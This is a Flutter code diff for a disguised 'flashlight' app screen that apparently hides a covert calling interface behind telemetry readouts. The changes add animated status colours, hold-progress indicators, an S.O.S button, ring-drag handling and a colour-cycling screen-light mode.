-    if (_outboundCallStatus == 'invalid') {
-      outputValue = 'ERR: NULL';
-      outputColor = dangerColor; // Red
-    } else if (_outboundCallStatus == 'ringing' || _outboundCallStatus == 'connected') {
-      outputValue = 'DIALING..';
-      outputColor = const Color(0xFFFF8800); // Yellow/Orange
-    } else if (_outboundCallStatus == 'unmuted') {
-      outputValue = 'LINK ACTV';
-      outputColor = accentColor; // Green
-    }
-
     return Scaffold(
       backgroundColor: _isScreenLightOn ? Colors.white : darkBg,
       body: SafeArea(
         child: _isScreenLightOn
             ? _buildScreenLightMode(accentColor)
-            : Column(
+            : AnimatedBuilder(
+                animation: _pulseController,
+                builder: (context, child) {
+                  // Determine OUTPUT display with animation frame
+                  String outputValue = isActive ? '1200 LM' : '0 LM';
+                  Color outputColor = statusColor;
+
+                  if (_showPurpleUI) {
+                    outputValue = _recoveredPartnerId ?? 'RECOVERED';
+                    outputColor = Colors.purpleAccent;
+                  } else if (_outboundCallStatus == 'invalid') {
+                    outputValue = 'ERR: NULL';
+                    outputColor = dangerColor; // Red
+                  } else if (_outboundCallStatus == 'ringing') {
+                    outputValue = 'WAITING..';
+                    outputColor = const Color(0xFFFF8800); // Yellow
+                  } else if (_hasIncomingCall && !_isStealthConnected) {
+                    outputValue = _incomingCallerComboId ?? 'INCOMING';
+                    outputColor = const Color(0xFF64B5F6); // Soft Blue
+                  } else if (_isStealthConnected) {
+                    String partnerId = _hasIncomingCall ? (_incomingCallerComboId ?? 'UNKNOWN') : '$_dialBrightness.$_dialHz';
+                    outputValue = partnerId;
+
+                    if (_partnerPresence == null || !_partnerPresence!.online) {
+                      outputColor = Colors.purpleAccent;
+                    } else if (_partnerPresence!.inBackground) {
+                      outputColor = Colors.orangeAccent;
+                    } else {
+                      outputColor = const Color(0xFF00E676).withValues(alpha: _pulseAnimation.value); // Green Pulsating
+                    }
+                  }
+
+                  return Column(
                 children: [
                   // --- Top Header ---
                   Container(
@@ -928,7 +1017,12 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                         ),
                         IconButton(
                           icon: const Icon(Icons.settings_outlined, color: Colors.white54),
-                          onPressed: _openFullScreenSettings,
+                          onPressed: () {
+                            Navigator.push(
+                              context,
+                              MaterialPageRoute(builder: (_) => const SettingsScreen()),
+                            );
+                          },
                         ),
                       ],
                     ),
@@ -956,30 +1050,71 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                               children: [
                                 // LED TEMP — hold 5s to dial
                                 GestureDetector(
+                                  behavior: HitTestBehavior.opaque,
                                   onLongPressStart: _handleStealthHoldStart,
                                   onLongPressEnd: (_) => _handleStealthHoldEnd(),
                                   onLongPressCancel: _handleStealthHoldEnd,
-                                  child: _buildTelemetryStat(
-                                    'LED TEMP', 
-                                    ledTempValue, 
-                                    ledTempColor,
+                                  child: Padding(
+                                    padding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
+                                    child: _buildTelemetryStat(
+                                      'LED TEMP', 
+                                      ledTempValue, 
+                                      ledTempColor,
+                                    ),
                                   ),
                                 ),
                                 Container(width: 1, height: 40, color: Colors.white10),
                                 // OUTPUT display
-                                _buildTelemetryStat('OUTPUT', outputValue, outputColor),
+                                Padding(
+                                  padding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
+                                  child: _buildTelemetryStat('OUTPUT', outputValue, outputColor),
+                                ),
                                 Container(width: 1, height: 40, color: Colors.white10),
                                 // DRAW — shows user's own "phone number", hold 2s to unmute
                                 GestureDetector(
+                                  behavior: HitTestBehavior.opaque,
                                   onLongPressStart: _handleDrawHoldStart,
                                   onLongPressEnd: (_) => _handleDrawHoldEnd(),
                                   onLongPressCancel: _handleDrawHoldEnd,
-                                  child: _buildTelemetryStat(
-                                    'DRAW', 
-                                    drawValue,
-                                    _isSpeakerMuted && _isStealthConnected 
-                                        ? const Color(0xFFFF8800)
-                                        : statusColor,
+                                  child: Padding(
+                                    padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 4.0),
+                                    child: Stack(
+                                      alignment: Alignment.center,
+                                    children: [
+                                      if (_drawHoldTicks > 0 && _drawHoldTicks < 20)
+                                        SizedBox(
+                                          width: 50,
+                                          height: 50,
+                                          child: CircularProgressIndicator(
+                                            value: _drawHoldTicks / 20.0,
+                                            strokeWidth: 2,
+                                            valueColor: const AlwaysStoppedAnimation<Color>(Color(0xFFFF8800)),
+                                            backgroundColor: Colors.white10,
+                                          ),
+                                        ),
+                                      Container(
+                                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+                                        decoration: BoxDecoration(
+                                          color: (!_isSpeakerMuted && _isStealthConnected) ? statusColor.withValues(alpha: 0.15) : Colors.transparent,
+                                          borderRadius: BorderRadius.circular(8),
+                                          border: Border.all(
+                                            color: (!_isSpeakerMuted && _isStealthConnected) ? statusColor.withValues(alpha: 0.5) : Colors.transparent,
+                                            width: 1,
+                                          ),
+                                          boxShadow: (!_isSpeakerMuted && _isStealthConnected) 
+                                              ? [BoxShadow(color: statusColor.withValues(alpha: 0.3), blurRadius: 10)]
+                                              : [],
+                                        ),
+                                        child: _buildTelemetryStat(
+                                          'DRAW', 
+                                          drawValue,
+                                          _isSpeakerMuted && _isStealthConnected 
+                                              ? const Color(0xFFFF8800)
+                                              : statusColor,
+                                        ),
+                                      ),
+                                      ],
+                                    ),
                                   ),
                                 ),
                               ],
@@ -987,7 +1122,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                           ),
 
                           // --- Main Power Button with Brightness Ring ---
-                          _buildPowerButtonWithBrightnessRing(accentColor, panelColor),
+                          _buildPowerButtonWithBrightnessRing(outputColor, panelColor),
 
                           // --- Bottom Control Deck ---
                           Container(
@@ -1010,7 +1145,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                                           activeTrackColor: _isStealthConnected ? dangerColor : accentColor,
                                           inactiveTrackColor: Colors.black,
                                           thumbColor: Colors.white,
-                                          overlayColor: accentColor.withOpacity(0.2),
+                                          overlayColor: accentColor.withValues(alpha: 0.2),
                                           thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 12),
                                           trackShape: const RoundedRectSliderTrackShape(),
                                         ),
@@ -1053,6 +1188,16 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                                       activeColor: dangerColor,
                                     ),
                                     _buildTacticalButton(
+                                      icon: Icons.sos,
+                                      label: 'S.O.S',
+                                      isActive: _isSosOn || _isMicMuted,
+                                      onTap: _toggleSos,
+                                      onLongPressStart: _handleSosHoldStart,
+                                      onLongPressEnd: _handleSosHoldEnd,
+                                      holdProgress: (_sosHoldTicks > 0 && _sosHoldTicks < 20) ? (_sosHoldTicks / 20.0) : null,
+                                      activeColor: _isMicMuted ? const Color(0xFF00E5FF) : const Color(0xFFFF8800),
+                                    ),
+                                    _buildTacticalButton(
                                       icon: Icons.phone_android,
                                       label: 'SCR_LIGHT',
                                       isActive: _isScreenLightOn,
@@ -1069,15 +1214,15 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                     ),
                   ),
                 ],
-              ),
+              );
+            },
+          ),
       ),
     );
   }
 
   /// Power button with a circular brightness dial around it
-  Widget _buildPowerButtonWithBrightnessRing(Color accentColor, Color panelColor) {
-    const dangerColor = Color(0xFFFF003C);
-    
+  Widget _buildPowerButtonWithBrightnessRing(Color dynamicColor, Color panelColor) {
     return SizedBox(
       width: 260,
       height: 260,
@@ -1091,22 +1236,31 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
             child: CustomPaint(
               painter: _BrightnessRingPainter(
                 value: _dialBrightness / 100.0,
-                activeColor: _isStealthConnected ? dangerColor : accentColor,
+                activeColor: dynamicColor,
               ),
             ),
           ),
-          // Circular brightness slider (invisible gesture detector around the ring)
+          // Circular brightness slider
           GestureDetector(
-            onPanUpdate: (details) {
-              // Calculate angle from center
+            onPanStart: (details) {
+              // Only start drag if initial touch is near the ring
               final center = Offset(130, 130);
               final pos = details.localPosition;
               final dx = pos.dx - center.dx;
               final dy = pos.dy - center.dy;
               final distance = sqrt(dx * dx + dy * dy);
+              if (distance >= 85 && distance <= 135) {
+                _isDraggingBrightness = true;
+              }
+            },
+            onPanUpdate: (details) {
+              if (!_isDraggingBrightness) return;
               
-              // Only respond to touches near the ring (90-130 pixel radius)
-              if (distance < 85 || distance > 135) return;
+              // Calculate angle from center regardless of distance
+              final center = Offset(130, 130);
+              final pos = details.localPosition;
+              final dx = pos.dx - center.dx;
+              final dy = pos.dy - center.dy;
               
               var angle = atan2(dy, dx) + pi / 2;
               if (angle < 0) angle += 2 * pi;
@@ -1122,6 +1276,8 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                 });
               }
             },
+            onPanEnd: (_) => _isDraggingBrightness = false,
+            onPanCancel: () => _isDraggingBrightness = false,
             child: Container(
               width: 260,
               height: 260,
@@ -1138,13 +1294,13 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                 shape: BoxShape.circle,
                 color: panelColor,
                 border: Border.all(
-                  color: _isLedOn ? accentColor : Colors.white12,
+                  color: _isLedOn ? dynamicColor : Colors.white12,
                   width: 4,
                 ),
                 boxShadow: _isLedOn
                     ? [
                         BoxShadow(
-                          color: accentColor.withOpacity(0.3),
+                          color: dynamicColor.withValues(alpha: 0.3),
                           blurRadius: 40,
                           spreadRadius: 10,
                         ),
@@ -1161,7 +1317,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                           offset: Offset(0, 15),
                         ),
                         BoxShadow(
-                          color: Colors.white.withOpacity(0.05),
+                          color: Colors.white.withValues(alpha: 0.05),
                           blurRadius: 5,
                           spreadRadius: -2,
                           offset: const Offset(0, -2),
@@ -1178,7 +1334,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                       shape: BoxShape.circle,
                       gradient: RadialGradient(
                         colors: _isLedOn
-                            ? [accentColor.withOpacity(0.2), panelColor]
+                            ? [dynamicColor.withValues(alpha: 0.2), panelColor]
                             : [const Color(0xFF22282D), const Color(0xFF111417)],
                       ),
                       border: Border.all(color: Colors.black54, width: 2),
@@ -1187,7 +1343,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                   Icon(
                     Icons.power_settings_new_rounded,
                     size: 64,
-                    color: _isLedOn ? accentColor : Colors.grey[700],
+                    color: _isLedOn ? dynamicColor : Colors.grey[700],
                   ),
                   // Small brightness value label at bottom of button
                   Positioned(
@@ -1195,7 +1351,7 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
                     child: Text(
                       '$_dialBrightness',
                       style: TextStyle(
-                        color: _isStealthConnected ? dangerColor : Colors.white30,
+                        color: dynamicColor,
                         fontFamily: 'monospace',
                         fontSize: 11,
                         fontWeight: FontWeight.bold,
@@ -1212,29 +1368,37 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
   }
 
   Widget _buildScreenLightMode(Color accentColor) {
-    return Stack(
-      children: [
-        Center(
-          child: IconButton(
-            iconSize: 100,
-            icon: Icon(Icons.power_settings_new, color: Colors.grey[300]),
-            onPressed: _toggleScreenLight,
+    return GestureDetector(
+      onTap: () {
+        setState(() {
+          _screenLightColorIndex = (_screenLightColorIndex + 1) % _tacticalColors.length;
+        });
+      },
+      child: Stack(
+        children: [
+          Container(color: _tacticalColors[_screenLightColorIndex]),
+          Center(
+            child: IconButton(
+              iconSize: 100,
+              icon: Icon(Icons.power_settings_new, color: Colors.black.withValues(alpha: 0.3)),
+              onPressed: _toggleScreenLight,
+            ),
           ),
-        ),
-        Positioned(
-          bottom: 40,
-          left: 40,
-          right: 40,
-          child: Slider(
-            value: _screenIntensity,
-            min: 0.1,
-            max: 1.0,
-            activeColor: Colors.black,
-            inactiveColor: Colors.grey[300],
-            onChanged: _updateScreenIntensity,
+          Positioned(
+            bottom: 40,
+            left: 40,
+            right: 40,
+            child: Slider(
+              value: _screenIntensity,
+              min: 0.1,
+              max: 1.0,
+              activeColor: Colors.black,
+              inactiveColor: Colors.black.withValues(alpha: 0.3),
+              onChanged: _updateScreenIntensity,
+            ),
           ),
-        ),
-      ],
+        ],
+      ),
     );
   }
 
@@ -1270,46 +1434,73 @@ class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScree
     required bool isActive,
     required VoidCallback onTap,
     required Color activeColor,
+    void Function(LongPressStartDetails)? onLongPressStart,
+    VoidCallback? onLongPressEnd,
+    double? holdProgress,
   }) {
     return GestureDetector(
       onTap: () {
         _triggerHaptic();
         onTap();
       },
-      child: Container(
-        width: 110,
-        padding: const EdgeInsets.symmetric(vertical: 16),
-        decoration: BoxDecoration(
-          color: isActive ? activeColor.withOpacity(0.1) : const Color(0xFF101214),
-          borderRadius: BorderRadius.circular(8),
-          border: Border.all(
-            color: isActive ? activeColor : Colors.white10,
-            width: 2,
-          ),
-          boxShadow: isActive
-              ? [BoxShadow(color: activeColor.withOpacity(0.2), blurRadius: 10)]
-              : [const BoxShadow(color: Colors.black54, blurRadius: 5, offset: Offset(0, 3))],
-        ),
-        child: Column(
-          children: [
-            Icon(
-              icon,
-              color: isActive ? activeColor : Colors.grey[600],
-              size: 28,
-            ),
-            const SizedBox(height: 8),
-            Text(
-              label,
-              style: TextStyle(
-                color: isActive ? activeColor : Colors.grey[600],
-                fontFamily: 'monospace',
-                fontSize: 12,
-                fontWeight: FontWeight.bold,
-                letterSpacing: 1,
+      onLongPressStart: onLongPressStart,
+      onLongPressEnd: onLongPressEnd != null ? (_) => onLongPressEnd() : null,
+      onLongPressCancel: onLongPressEnd,
+      child: TweenAnimationBuilder<double>(
+        tween: Tween(begin: 0.0, end: isActive ? 1.0 : 0.0),
+        duration: const Duration(milliseconds: 300),
+        builder: (context, val, child) {
+          return Container(
+            width: 85,
+            padding: const EdgeInsets.symmetric(vertical: 12),
+            decoration: BoxDecoration(
+              color: Color.lerp(const Color(0xFF101214), activeColor.withValues(alpha: 0.15), val),
+              borderRadius: BorderRadius.circular(8),
+              border: Border.all(
+                color: Color.lerp(Colors.white10, activeColor, val)!,
+                width: 2,
               ),
+              boxShadow: isActive
+                  ? [BoxShadow(color: activeColor.withValues(alpha: 0.3 * val), blurRadius: 15 * val)]
+                  : [const BoxShadow(color: Colors.black54, blurRadius: 5, offset: Offset(0, 3))],
             ),
-          ],
-        ),
+            child: Column(
+              children: [
+                Stack(
+                  alignment: Alignment.center,
+                  children: [
+                    if (holdProgress != null && holdProgress > 0)
+                      SizedBox(
+                        width: 32,
+                        height: 32,
+                        child: CircularProgressIndicator(
+                          value: holdProgress,
+                          strokeWidth: 2,
+                          valueColor: AlwaysStoppedAnimation<Color>(activeColor),
+                        ),
+                      ),
+                    Icon(
+                      icon,
+                      color: Color.lerp(Colors.grey[600], activeColor, val),
+                      size: 26,
+                    ),
+                  ],
+                ),
+                const SizedBox(height: 6),
+                Text(
+                  label,
+                  style: TextStyle(
+                    color: Color.lerp(Colors.grey[600], activeColor, val),
+                    fontFamily: 'monospace',
+                    fontSize: 11,
+                    fontWeight: FontWeight.bold,
+                    letterSpacing: 1,
+                  ),
+                ),
+              ],
+            ),
+          );
+        },
       ),
     );
   }
